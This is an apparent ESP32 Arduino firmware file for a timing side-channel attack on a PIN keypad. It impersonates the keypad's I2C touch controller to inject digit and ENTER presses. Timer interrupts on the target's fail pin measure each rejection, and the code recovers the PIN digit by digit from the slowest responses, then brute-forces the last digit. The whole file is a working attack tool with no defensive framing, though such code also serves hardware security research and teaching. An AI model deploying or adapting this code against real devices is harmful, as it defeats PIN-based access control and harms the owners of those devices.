#include <Arduino.h>
#include <Wire.h> 
#include "touchHandle.h"

using namespace Touch;

namespace TSCA {
    #define FAIL_PIN GPIO_NUM_27
    #define FAIL_PIN2 12
    #define SUCCESS_PIN 14
    #define NUM_OF_ITERAIONS 20
    #define PASS_SIZE 4 
    const float PROGRESS_INTERVAL = 100.0 / (NUM_OF_ITERAIONS * (PASS_SIZE-1) * 10);
    hw_timer_t * fastTimer = NULL;
    hw_timer_t * slowTimer = NULL;
    volatile uint64_t endTime = 0;
    volatile bool measure = false;
    typedef enum {NOTHING, FINISHED_BATCH, SUCCESS, FAIL, INC, FOUND_I2C} EventType_t;
    EventType_t eventState = NOTHING;
    float progress = 0;

    bool finish = false;
    TaskHandle_t tftTaskHandle = NULL;
    TaskHandle_t TSCATaskHandle = NULL;

    void IRAM_ATTR stopTimer();

    void IRAM_ATTR startTimer();

    void onRec_Callback(int numOfBytes);

    void onReq_Callback();

    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock);

    void TSCALoop(void*);

    void theEnd();

    void i2cTask(void *parameter) {

        while(!Wire.begin(0x5A, SDA, SCL, 400000)){delay(10);}
        Wire.onReceive(onRec_Callback);
        Wire.onRequest(onReq_Callback);
        TSCA::eventState = FOUND_I2C;
        xTaskNotifyGive(tftTaskHandle);
        xTaskNotifyGive(TSCATaskHandle);
        vTaskDelete(NULL);
    }

    uint8_t pass[PASS_SIZE];

    void TSCALoop(void* arg) {
        pinMode(FAIL_PIN, INPUT);
        pinMode(SUCCESS_PIN, INPUT);
        
        // Attach interrupts
        attachInterrupt(digitalPinToInterrupt(FAIL_PIN), stopTimer, RISING);
        attachInterrupt(digitalPinToInterrupt(SUCCESS_PIN), theEnd, RISING);

        delay(10);

        // Initialize the timer
        fastTimer = timerBegin(0, 2, true); // Use timer 0, prescaler 1 (4.17ns per tick), count up
        //slowTimer = timerBegin(1, 16, true);
        for (uint8_t i = 0; i < 4; i++)
        {
            data[i] = 0xFF;
        }

        ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
        delay(3000);
        reset();
        relaese();
        delay(1500);
        const uint8_t initPass[PASS_SIZE] = {0,0,0,0};
        // generate the password each loop iteration
        for(;;){
            memcpy(pass, initPass, PASS_SIZE);

            for (uint8_t index = 0; index < PASS_SIZE-1; index++)
            {
                uint16_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
                uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
                for (uint32_t i = 0; i < NUM_OF_ITERAIONS; i++){
                    uint64_t max_time = 0;
                    for (uint8_t j = 0; j < 10; j++)
                    {
                        pass[index] = j;
                        results[j] = sendPassword(pass, (SemaphoreHandle_t*)arg);
                        if(results[j] > max_time)
                            max_time = results[j];
                        progress += PROGRESS_INTERVAL;
                        if (tftTaskHandle != NULL) {
                            TSCA::eventState = INC;
                            xTaskNotifyGive(tftTaskHandle);
                        }
                        /*for (int i = 0; i < 10; i++) {
                            Serial.print(results[i]);
                            Serial.print(" ");
                        }
                        Serial.println();*/
                    }
                    for (uint8_t j = 0; j < 10; j++)
                        if(results[j] == max_time)
                            maxes[j]++;
                }
                for (int i = 0; i < 10; i++) {
                    Serial.print(maxes[i]);
                    Serial.print(" ");
                }
                Serial.println();
                for (int i = 0; i < 10; i++) {
                    Serial.print(results[i]);
                    Serial.print(" ");
                }
                Serial.println();
                
                uint16_t max = 0;
                uint16_t maxval = 0;
                for (uint8_t j = 0; j < 10; j++)
                    if(maxes[j] > maxval){
                        max = j;
                        maxval = maxes[j];
                    }
                pass[index] = max;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = FINISHED_BATCH;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            for (uint8_t j = 0; j < 10; j++)
            {
                pass[PASS_SIZE-1] = j;
                sendPassword(pass, (SemaphoreHandle_t*)arg);
                progress += PROGRESS_INTERVAL*NUM_OF_ITERAIONS;
                if (tftTaskHandle != NULL) {
                    TSCA::eventState = INC;
                    xTaskNotifyGive(tftTaskHandle);
                }
            }
            progress = 0;
            if (tftTaskHandle != NULL) {
                TSCA::eventState = FAIL;
                xTaskNotifyGive(tftTaskHandle);
            }
        }
    }

    //================================================================================================

    // ISR for FAIL_PIN
    void IRAM_ATTR stopTimer() {
        if (measure) {
            endTime = timerRead(fastTimer);// + timerRead(slowTimer);
            measure = false;
        }
    }

    void IRAM_ATTR startTimer() {
        if (!measure) {
            timerWrite(fastTimer, 0); // Reset the timer
            //timerWrite(slowTimer, 0); // Reset the timer
            measure = true;
        }
    }

    void onRec_Callback(int numOfBytes){
        for(uint8_t i = 0 ; Wire.available() ; i++){
            data[i] = Wire.read();
        }
    }
    void onReq_Callback(){
        if(data[0] == 0x5E){
            Wire.write(0x24);
        }
        else if(data[0] == 0x5D){
            Wire.write(0x0);
        }
        else if(data[0] == 0x00){
            Wire.write((uint8_t)Touch::state);
            Wire.write(Touch::state >> 8);
            if(Touch::state == ENTER_BUTTON){
                startTimer();
            }
        }
        data[0] = 0xFF;
    }

    uint64_t sendPassword(uint8_t* password, SemaphoreHandle_t* lock)
    {
        for (uint8_t i = 0; i < PASS_SIZE; i++){
            touch(password[i]);
            relaese();
        }

        enter();
        while (measure || endTime == 0){}
            //Serial.printf("%d ,%" PRIu64 ",%" PRIu64 "\n" , measure, endTime, startTime);

        uint64_t duration = endTime;
        endTime = 0; // Reset endTime for next measurement

        return duration;
    }

    void theEnd() {
        if (Touch::state == ENTER_BUTTON) {
            detachInterrupt(SUCCESS_PIN);
            detachInterrupt(FAIL_PIN);
            Serial.println("The End");
            TSCA::eventState = SUCCESS;
            xTaskNotifyGive(tftTaskHandle);
            for (size_t i = 0; i < PASS_SIZE; i++) {
                Serial.print(pass[i]);
            }
            vTaskDelete(NULL);
        }
    }
}